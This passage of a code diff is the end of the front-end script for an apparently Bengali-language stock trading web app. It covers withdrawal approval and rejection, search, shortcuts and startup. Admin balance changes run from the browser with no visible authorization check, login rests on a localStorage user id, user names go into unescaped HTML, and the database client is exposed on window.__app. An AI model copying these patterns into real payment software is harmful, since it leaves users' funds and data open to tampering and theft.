+        async function loadWithdrawRequests() {
+            try {
+                const { data, error } = await supabase
+                    .from('transactions')
+                    .select('*, users(name, phone)')
+                    .eq('type', 'withdraw')
+                    .eq('status', 'pending')
+                    .order('created_at', { ascending: true });
+                if (error) throw error;
+                const container = $('admin-withdraw-list');
+                if (!data || !data.length) {
+                    container.innerHTML = '<p style="color:var(--text-secondary);font-size:13px;">কোনো পেন্ডিং উইথড্র নেই</p>';
+                    return;
+                }
+                container.innerHTML = data.map(t => `
+              <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border-color);font-size:12px;flex-wrap:wrap;gap:4px;">
+                <span><strong>${t.users?.name || 'N/A'}</strong> (${t.users?.phone || ''})</span>
+                <span>₹${Number(t.amount).toFixed(2)}</span>
+                <span>
+                  <button class="btn btn-sm btn-green" style="font-size:10px;padding:2px 8px;" onclick="approveWithdraw('${t.id}')">✅ অ্যাপ্রুভ</button>
+                  <button class="btn btn-sm btn-red" style="font-size:10px;padding:2px 8px;" onclick="rejectWithdraw('${t.id}')">❌ রিজেক্ট</button>
+                </span>
+              </div>
+            `).join('');
+            } catch (e) { console.error(e); }
+        }
+
+        window.approveWithdraw = async function(txId) {
+            try {
+                const { data: tx } = await supabase
+                    .from('transactions')
+                    .select('user_id, amount')
+                    .eq('id', txId)
+                    .single();
+                if (!tx) return toast('লেনদেন পাওয়া যায়নি', 'error');
+
+                // Update transaction
+                await supabase.from('transactions').update({ status: 'approved' }).eq('id', txId);
+
+                // Deduct from user balance
+                const { data: user } = await supabase
+                    .from('users')
+                    .select('balance')
+                    .eq('id', tx.user_id)
+                    .single();
+                if (user) {
+                    const newBal = user.balance - tx.amount;
+                    await supabase.from('users').update({ balance: newBal }).eq('id', tx.user_id);
+                    if (tx.user_id === currentUser.id) {
+                        currentUser.balance = newBal;
+                        updateUI();
+                    }
+                }
+
+                toast('✅ উইথড্র অ্যাপ্রুভড', 'success');
+                loadWithdrawRequests();
+                loadAllUsers();
+                if (tx.user_id === currentUser.id) {
+                    await loadTransactions();
+                    renderTransactions();
+                    updateUI();
+                }
+            } catch (err) { toast(err.message, 'error'); }
+        };
+
+        window.rejectWithdraw = async function(txId) {
+            try {
+                await supabase.from('transactions').update({ status: 'rejected' }).eq('id', txId);
+                toast('❌ উইথড্র রিজেক্ট', 'warning');
+                loadWithdrawRequests();
+                if (txId === currentUser?.id) {
+                    await loadTransactions();
+                    renderTransactions();
+                }
+            } catch (err) { toast(err.message, 'error'); }
+        };
+
+        function updateAdminStats() {
+            $('admin-total-users').textContent = allUsers.length;
+            $('admin-total-stocks').textContent = allStocks.length;
+            $('admin-total-orders').textContent = allOrders.length;
+            const pending = allTransactions.filter(t => t.type === 'withdraw' && t.status === 'pending').length;
+            $('admin-pending-withdraw').textContent = pending;
+        }
+
+        // ===================================================================
+        // SEARCH
+        // ===================================================================
+        $('market-search').addEventListener('input', renderMarketTable);
+        $('market-search-full').addEventListener('input', renderMarketsFull);
+
+        // ===================================================================
+        // KEYBOARD SHORTCUTS
+        // ===================================================================
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+            if (e.ctrlKey && e.key === 'l') {
+                e.preventDefault();
+                navigateTo('dashboard');
+            }
+            if (e.ctrlKey && e.key === 'm') {
+                e.preventDefault();
+                navigateTo('markets');
+            }
+            if (e.ctrlKey && e.key === 'w') {
+                e.preventDefault();
+                navigateTo('wallet');
+            }
+        });
+
+        // ===================================================================
+        // INIT
+        // ===================================================================
+        // Check auto-login
+        checkAutoLogin();
+
+        // If not logged in, show auth
+        if (!localStorage.getItem('stock_user_id')) {
+            authPage.style.display = 'flex';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Disable right click on sensitive areas (optional)
+        // document.addEventListener('contextmenu', e => e.preventDefault());
+
+        console.log('🚀 StockExchange India - প্ল্যাটফর্ম লোড হয়েছে');
+        console.log('📊 সব ফিচার রেডি: ট্রেড, ডিপোজিট, উইথড্র, অ্যাডমিন');
+
+        // ===================================================================
+        // EXPOSE FOR CONSOLE DEBUG
+        // ===================================================================
+        window.__app = {
+            supabase,
+            currentUser,
+            allStocks,
+            userPortfolio,
+            allOrders,
+            allTransactions,
+            loadStocks,
+            placeOrder,
+            createTransaction,
+            navigateTo,
+            toast
+        };
+
+        console.log('💡 ডিবাগ: window.__app');
+    </script>
 
 </body>
 </html>
